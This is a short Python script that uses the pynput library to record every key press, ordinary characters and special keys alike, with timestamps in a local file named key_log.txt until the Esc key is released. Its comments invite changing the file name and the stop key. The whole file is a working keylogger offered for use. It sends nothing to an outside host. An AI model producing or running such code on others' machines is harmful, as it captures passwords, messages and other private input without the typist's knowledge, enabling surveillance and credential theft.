from pynput import keyboard
import logging

# Change log file destination and name
log_file = "key_log.txt"

# Change log level to logging.DEBUG to see all key presses
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info("Key {0} pressed.".format(key.char))
    except AttributeError:
        logging.info("Special key {0} pressed.".format(key))

#change trigger key to whatever you want
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Klavye dinleyicisini başlatın
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
